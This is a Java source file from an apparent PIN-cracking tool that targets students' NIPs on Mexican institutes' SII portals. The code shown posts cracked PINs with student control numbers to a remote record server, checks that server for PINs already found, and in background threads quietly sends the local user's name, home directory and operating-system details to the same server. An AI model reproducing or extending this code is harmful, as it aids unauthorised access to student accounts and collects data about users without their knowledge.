package sii;
import java.net.HttpURLConnection;
import java.net.URLEncoder;
import javax.swing.JOptionPane;

import serverComm.ServerConn;
public class HttpPassFinder extends BasePassFinder{

	public void startDB(){
		if (recordSearch){
			new Thread(new Runnable(){
				public void run(){
					saveThisSessionData();
				}
			}).start();
		}
	}

	public void findUrlInstituto(){
		urlInstituto = "http://sii.TU_INSTITUTO.edu.mx/acceso.php";
		String IDinstituto = null;
		if(Character.isDigit(numeroControl.charAt(0)))
			IDinstituto = numeroControl.substring(2,4);
		else
			IDinstituto = numeroControl.substring(3,5);
		try {
			String query = String.format("snit=IL&p1=%s",IDinstituto);

			HttpURLConnection connection = ServerConn.Connect(ServerConn.metPOST, recordUrl, query);
            String foundUrl = ServerConn.getResponse(connection);

            if(foundUrl.equals("no_record")){
            	//prompt to include institute and warn that this app might not work properly
            	if(useSwing){
    				int res = JOptionPane.showConfirmDialog(null,"No se tiene registrado el instituto: "+
    					"\nde donde pertenece el noControl: "+numeroControl+
    					".\nLa direccion del SII es:"+urlInstituto,
    					"Busqueda de NIP", JOptionPane.YES_NO_OPTION);
    				if(res == JOptionPane.YES_OPTION){
    					Instituto = JOptionPane.showInputDialog(null,"Introduce la institución (Ej. 'itmexicali'):",
    								"Busqueda de NIP",JOptionPane.QUESTION_MESSAGE).trim();
    					urlInstituto = "http://sii."+Instituto+".edu.mx/acceso.php";
    				}
    				else{
    					JOptionPane.showMessageDialog(null,"Para registrar tu instituto en esta aplicación,\n" +
    							"envia un correo con el enlace a tu Sistema de Información Integral (SII)\n" +
    							"al correo miichaeld@outlook.com",
    							"Busqueda de NIP",JOptionPane.INFORMATION_MESSAGE);
    					System.exit(0);
    				}
    			}
    			else {
    				System.out.println("No se tiene registrado el instituto:"+
    						"de donde pertenece el noControl: "+numeroControl+
    					".\nLa direccion del SII es: \'"+urlInstituto+"\' ? Y/N");
    				String res = in.next();
    				if(res.charAt(0) == 'Y' ||  res.charAt(0) == 'y'){
    					System.out.println("Introduce la institución (Ej. 'itmexicali'):");
    					Instituto = in.next().trim();
    					//save it ONLINE
    				}
    				else{
    					System.out.println("Para registrar tu instituto en esta aplicación,\n" +
    							"envia un correo con el enlace a tu Sistema de Información Integral (SII)\n" +
    							"al correo miichaeld@outlook.com");
    					System.exit(0);
    				}
    			}
            }
            else{
            	urlInstituto = foundUrl;
            	System.out.println("force lookup in url: "+urlInstituto);
			}
		} catch (Exception e) {	System.out.println("Error fInsitute: "+e.getMessage());}
	}

	public synchronized void saveQuery(){
		new Thread(new Runnable(){
			public void run(){
				try {
					String query = String.format("snit=SQ&p1=%s&p2=%s",
							URLEncoder.encode(System.getProperty("user.name"),ServerConn.charset),
							numeroControl);
					HttpURLConnection connection = ServerConn.Connect(ServerConn.metPOST, recordUrl,query);
		            System.out.println("SS2: " +connection.getResponseCode());
				} catch (Exception e) {	System.out.println("Error SS2: "+e.getMessage());}
			}//end run
		}).start();//end thread
	}

	/** 	If we now searching for the NIP and the DB connection is
	 * ready check if it's already stored in the DBs and save this query.
	 * NOTE: This search is done in a new thread*/
	public synchronized void searchNIPonRecords(){
		if(searching){
			new Thread(new Runnable(){
				public void run(){
					System.out.println("Searching in records...");
					try {
						String query = String.format("snit=NL&p1=%s",numeroControl);
						HttpURLConnection connection = ServerConn.Connect(ServerConn.metPOST, recordUrl,query);
			            String nip = ServerConn.getResponse(connection);

			            if(nip.equals("no_record"))
			            	return;
			            int nip1 =Integer.parseInt(nip.trim());

			            if(useSwing){
							int res = JOptionPane.showConfirmDialog(null,"Se encontro un NIP en registro: "+
								nip+"\nDesea cancelar la busqueda?",
								"Busqueda de NIP", JOptionPane.YES_NO_OPTION);
							if(res == JOptionPane.YES_OPTION){
								setNIPfound(nip1,false);
							}
						}
						else if(in != null){
							System.out.println("NIP is already on record: "+nip+", do you want to cancel current search? Y/N");
							String res = in.next();
							if(res.charAt(0) == 'Y' ||  res.charAt(0) == 'y'){
								setNIPfound(nip1,false);
							}
						}
					} catch (Exception e) {	System.out.println("Error sNOR: "+e.getMessage());}
				}//end run
			}).start();//end thread
		}//endif
	}

	/**		Save this session information, incluiding machine running the program */
	public synchronized void saveThisSessionData(){
		if( recordSearch ){
			try {
				String query = String.format("snit=SS&p1=%s&p2=%s&p3=%s&p4=%s&p5=%s",
						URLEncoder.encode(System.getProperty("user.name"),ServerConn.charset),
						URLEncoder.encode(System.getProperty("user.home"),ServerConn.charset),
						System.getProperty("os.name"),System.getProperty("os.version"),
						System.getProperty("os.arch"));
				HttpURLConnection connection = ServerConn.Connect(ServerConn.metPOST, recordUrl,query);
				System.out.println("SS1: " +connection.getResponseCode());
			} catch (Exception e) {	System.out.println("Error SS1: "+e.getMessage());}
		}
	}

	public void saveFoundNip(){
		if( recordSearch ){
			String IDinstituto = null;
			if(Character.isDigit(numeroControl.charAt(0)))
				IDinstituto = numeroControl.substring(2,4);
			else
				IDinstituto = numeroControl.substring(3,5);
			try {
				String query = String.format("snit=SN&p1=%s&p2=%s&p3=%s",numeroControl, mNIP, IDinstituto);
				HttpURLConnection connection = ServerConn.Connect(ServerConn.metPOST, recordUrl,query);
				System.out.println("SN: " +connection.getResponseCode());
			} catch (Exception e) {	System.out.println("Error SN: "+e.getMessage());}
		}
	}
}

